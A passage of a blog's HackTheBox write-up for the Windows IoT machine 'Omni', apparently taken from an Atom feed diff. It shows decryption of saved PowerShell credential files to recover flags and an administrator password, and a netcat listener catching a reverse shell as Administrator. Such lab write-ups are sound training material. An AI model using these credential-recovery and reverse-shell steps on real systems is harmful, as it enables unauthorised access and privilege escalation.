+&lt;p&gt;We go back to the &lt;code&gt;app&lt;/code&gt;'s user data folder, and use
+&lt;a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring?view=powershell-7#example-2--create-a-secure-string-from-an-encrypted-string-in-a-file"&gt;Microsoft documentation&lt;/a&gt;
+to decrypt the user flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;C:\windows\system32&amp;gt;cd C:\Data\Users\app&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\Data\Users\app&amp;gt;type user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;type user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;Objs Version=&amp;quot;1.1.0.1&amp;quot; xmlns=&amp;quot;http://schemas.microsoft.com/powershell/2004/04&amp;quot;&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;Obj RefId=&amp;quot;0&amp;quot;&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;lt;TN RefId=&amp;quot;0&amp;quot;&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;      &amp;lt;T&amp;gt;System.Management.Automation.PSCredential&amp;lt;/T&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;      &amp;lt;T&amp;gt;System.Object&amp;lt;/T&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;lt;/TN&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;lt;ToString&amp;gt;System.Management.Automation.PSCredential&amp;lt;/ToString&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;lt;Props&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;      &amp;lt;S N=&amp;quot;UserName&amp;quot;&amp;gt;flag&amp;lt;/S&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;      &amp;lt;SS N=&amp;quot;Password&amp;quot;&amp;gt;01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7&amp;lt;/SS&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;lt;/Props&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;/Obj&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;/Objs&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\Data\Users\app&amp;gt;Powershell&lt;/span&gt;
+&lt;span class="code-line"&gt;Windows PowerShell&lt;/span&gt;
+&lt;span class="code-line"&gt;Copyright (C) Microsoft Corporation. All rights reserved.&lt;/span&gt;
+&lt;span class="code-line"&gt;PS C:\Data\Users\app&amp;gt; $Secure2 = ConvertTo-SecureString -String &amp;#39;01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;PS C:\Data\Users\app&amp;gt; $credential = New-Object System.Management.Automation.PSCredential (&amp;#39;root&amp;#39;, $Secure2)&lt;/span&gt;
+&lt;span class="code-line"&gt;PS C:\Data\Users\app&amp;gt; $credential.GetNetworkCredential().Password&lt;/span&gt;
+&lt;span class="code-line"&gt;$credential.GetNetworkCredential().Password&lt;/span&gt;
+&lt;span class="code-line"&gt;7cfd50f6bc34db3204898f1505ad9d70&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1 id="root"&gt;Root&lt;/h1&gt;
+&lt;p&gt;We do exactly the same with the &lt;code&gt;iot-admin.xml&lt;/code&gt; file to retrieve the
+administrator password.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;C:\Data\Users\app&amp;gt;type iot-admin.xml&lt;/span&gt;
+&lt;span class="code-line"&gt;type iot-admin.xml&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;Objs Version=&amp;quot;1.1.0.1&amp;quot; xmlns=&amp;quot;http://schemas.microsoft.com/powershell/2004/04&amp;quot;&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;Obj RefId=&amp;quot;0&amp;quot;&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;lt;TN RefId=&amp;quot;0&amp;quot;&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;      &amp;lt;T&amp;gt;System.Management.Automation.PSCredential&amp;lt;/T&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;      &amp;lt;T&amp;gt;System.Object&amp;lt;/T&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;lt;/TN&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;lt;ToString&amp;gt;System.Management.Automation.PSCredential&amp;lt;/ToString&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;lt;Props&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;      &amp;lt;S N=&amp;quot;UserName&amp;quot;&amp;gt;omni\administrator&amp;lt;/S&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;      &amp;lt;SS N=&amp;quot;Password&amp;quot;&amp;gt;01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa28853640000000002000000000010660000000100002000000000855856bea37267a6f9b37f9ebad14e910d62feb252fdc98a48634d18ae4ebe000000000e80000000020000200000000648cd59a0cc43932e3382b5197a1928ce91e87321c0d3d785232371222f554830000000b6205d1abb57026bc339694e42094fd7ad366fe93cbdf1c8c8e72949f56d7e84e40b92e90df02d635088d789ae52c0d640000000403cfe531963fc59aa5e15115091f6daf994d1afb3c2643c945f2f4b8f15859703650f2747a60cf9e70b56b91cebfab773d0ca89a57553ea1040af3ea3085c27&amp;lt;/SS&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;lt;/Props&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;/Obj&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;/Objs&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;PS C:\Data\Users\app&amp;gt; $Secure2 = ConvertTo-SecureString -String &amp;#39;01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa28853640000000002000000000010660000000100002000000000855856bea37267a6f9b37f9ebad14e910d62feb252fdc98a48634d18ae4ebe000000000e80000000020000200000000648cd59a0cc43932e3382b5197a1928ce91e87321c0d3d785232371222f554830000000b6205d1abb57026bc339694e42094fd7ad366fe93cbdf1c8c8e72949f56d7e84e40b92e90df02d635088d789ae52c0d640000000403cfe531963fc59aa5e15115091f6daf994d1afb3c2643c945f2f4b8f15859703650f2747a60cf9e70b56b91cebfab773d0ca89a57553ea1040af3ea3085c27&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;PS C:\Data\Users\app&amp;gt; $credential = New-Object System.Management.Automation.PSCredential (&amp;#39;root&amp;#39;, $Secure2)&lt;/span&gt;
+&lt;span class="code-line"&gt;$credential = New-Object System.Management.Automation.PSCredential (&amp;#39;root&amp;#39;, $Secure2)&lt;/span&gt;
+&lt;span class="code-line"&gt;PS C:\Data\Users\app&amp;gt; $credential.GetNetworkCredential().Password&lt;/span&gt;
+&lt;span class="code-line"&gt;$credential.GetNetworkCredential().Password&lt;/span&gt;
+&lt;span class="code-line"&gt;_1nt3rn37ofTh1nGz&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We once more connect to the web application on port 8080 and execute netcat to
+get a reverse shell as &lt;code&gt;administrator&lt;/code&gt;. And we use the above method to decrypt the root
+flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ nc -l -p 1234&lt;/span&gt;
+&lt;span class="code-line"&gt;Microsoft Windows [Version 10.0.17763.107]&lt;/span&gt;
+&lt;span class="code-line"&gt;Copyright (c) Microsoft Corporation. All rights reserved.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\windows\system32&amp;gt;echo %username%&lt;/span&gt;
+&lt;span class="code-line"&gt;echo %username%&lt;/span&gt;
+&lt;span class="code-line"&gt;Administrator&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\windows\system32&amp;gt;cd &amp;quot;C:\Data\Users\administrator\&lt;/span&gt;
+&lt;span class="code-line"&gt;cd &amp;quot;C:\Data\Users\administrator\&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\Data\Users\administrator&amp;gt;dir&lt;/span&gt;
+&lt;span class="code-line"&gt;dir&lt;/span&gt;
+&lt;span class="code-line"&gt;Volume in drive C is MainOS&lt;/span&gt;
+&lt;span class="code-line"&gt;Volume Serial Number is 3C37-C677&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Directory of C:\Data\Users\administrator&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;07/04/2020  09:48 PM    &amp;lt;DIR&amp;gt;          .&lt;/span&gt;
+&lt;span class="code-line"&gt;07/04/2020  09:48 PM    &amp;lt;DIR&amp;gt;          ..&lt;/span&gt;
+&lt;span class="code-line"&gt;07/03/2020  11:23 PM    &amp;lt;DIR&amp;gt;          3D Objects&lt;/span&gt;
+&lt;span class="code-line"&gt;07/03/2020  11:23 PM    &amp;lt;DIR&amp;gt;          Documents&lt;/span&gt;
+&lt;span class="code-line"&gt;07/03/2020  11:23 PM    &amp;lt;DIR&amp;gt;          Downloads&lt;/span&gt;
+&lt;span class="code-line"&gt;07/03/2020  11:23 PM    &amp;lt;DIR&amp;gt;          Favorites&lt;/span&gt;
+&lt;span class="code-line"&gt;07/03/2020  11:23 PM    &amp;lt;DIR&amp;gt;          Music&lt;/span&gt;
+&lt;span class="code-line"&gt;07/03/2020  11:23 PM    &amp;lt;DIR&amp;gt;          Pictures&lt;/span&gt;
+&lt;span class="code-line"&gt;07/04/2020  09:48 PM             1,958 root.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;07/03/2020  11:23 PM    &amp;lt;DIR&amp;gt;          Videos&lt;/span&gt;
+&lt;span class="code-line"&gt;              1 File(s)          1,958 bytes&lt;/span&gt;
+&lt;span class="code-line"&gt;              9 Dir(s)   4,691,116,032 bytes free&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\Data\Users\administrator&amp;gt;type root.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;type root.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;Objs Version=&amp;quot;1.1.0.1&amp;quot; xmlns=&amp;quot;http://schemas.microsoft.com/powershell/2004/04&amp;quot;&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;Obj RefId=&amp;quot;0&amp;quot;&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;lt;TN RefId=&amp;quot;0&amp;quot;&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;      &amp;lt;T&amp;gt;System.Management.Automation.PSCredential&amp;lt;/T&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;      &amp;lt;T&amp;gt;System.Object&amp;lt;/T&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;lt;/TN&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;lt;ToString&amp;gt;System.Management.Automation.PSCredential&amp;lt;/ToString&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;lt;Props&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;      &amp;lt;S N=&amp;quot;UserName&amp;quot;&amp;gt;flag&amp;lt;/S&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;      &amp;lt;SS N=&amp;quot;Password&amp;quot;&amp;gt;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000011d9a9af9398c648be30a7dd764d1f3a000000000200000000001066000000010000200000004f4016524600b3914d83c0f88322cbed77ed3e3477dfdc9df1a2a5822021439b000000000e8000000002000020000000dd198d09b343e3b6fcb9900b77eb64372126aea207594bbe5bb76bf6ac5b57f4500000002e94c4a2d8f0079b37b33a75c6ca83efadabe077816aa2221ff887feb2aa08500f3cf8d8c5b445ba2815c5e9424926fca73fb4462a6a706406e3fc0d148b798c71052fc82db4c4be29ca8f78f0233464400000008537cfaacb6f689ea353aa5b44592cd4963acbf5c2418c31a49bb5c0e76fcc3692adc330a85e8d8d856b62f35d8692437c2f1b40ebbf5971cd260f738dada1a7&amp;lt;/SS&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;lt;/Props&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;/Obj&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;/Objs&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\Data\Users\administrator&amp;gt;Powershell&lt;/span&gt;
+&lt;span class="code-line"&gt;Powershell&lt;/span&gt;
+&lt;span class="code-line"&gt;Windows PowerShell&lt;/span&gt;
+&lt;span class="code-line"&gt;Copyright (C) Microsoft Corporation. All rights reserved.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;PS C:\Data\Users\administrator&amp;gt; $Secure2 = ConvertTo-SecureString -String &amp;#39;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000011d9a9af9398c648be30a7dd764d1f3a000000000200000000001066000000010000200000004f4016524600b3914d83c0f88322cbed77ed3e3477dfdc9df1a2a5822021439b000000000e8000000002000020000000dd198d09b343e3b6fcb9900b77eb64372126aea207594bbe5bb76bf6ac5b57f4500000002e94c4a2d8f0079b37b33a75c6ca83efadabe077816aa2221ff887feb2aa08500f3cf8d8c5b445ba2815c5e9424926fca73fb4462a6a706406e3fc0d148b798c71052fc82db4c4be29ca8f78f0233464400000008537cfaacb6f689ea353aa5b44592cd4963acbf5c2418c31a49bb5c0e76fcc3692adc330a85e8d8d856b62f35d8692437c2f1b40ebbf5971cd260f738dada1a7&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;PS C:\Data\Users\administrator&amp;gt; $credential = New-Object System.Management.Automation.PSCredential (&amp;#39;root&amp;#39;, $Secure2)&lt;/span&gt;
+&lt;span class="code-line"&gt;PS C:\Data\Users\administrator&amp;gt; $credential.GetNetworkCredential().Password&lt;/span&gt;
+&lt;span class="code-line"&gt;$credential.GetNetworkCredential().Password&lt;/span&gt;
+&lt;span class="code-line"&gt;5dbdce5569e2c4708617c0ce6e9bf11d&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
+&lt;p&gt;I was really intrigued by the Unknown operating system but it turns out it was a
+simple guessing game and once you know what the operating system was the box was
+really straightforward (if you don't mess up the heavy &lt;code&gt;SYSTEM&lt;/code&gt; extraction as I
+did). This is clearly one of the worst box created by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/1190"&gt;egre55&lt;/a&gt; even if the fact to
+use Windows IOT is quit "funny".&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="Windows"></category><category term="IOT"></category></entry><entry><title>HTB: OpenKeyS</title><link href="https://maggick.fr/2020/12/htb-openkeys.html" rel="alternate"></link><published>2020-12-14T09:50:00+01:00</published><updated>2020-12-14T09:50:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-12-14:/2020/12/htb-openkeys.html</id><summary type="html">&lt;p&gt;&lt;img alt="openkeys card" class="align-left" src="/media/2020.12/openkeys_card.png" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;This is a writeup about a retired HacktheBox machine:
 &lt;a href="https://www.hackthebox.eu/home/machines/profile/267"&gt;OpenKeys&lt;/a&gt; published on
 July 25 2020 by
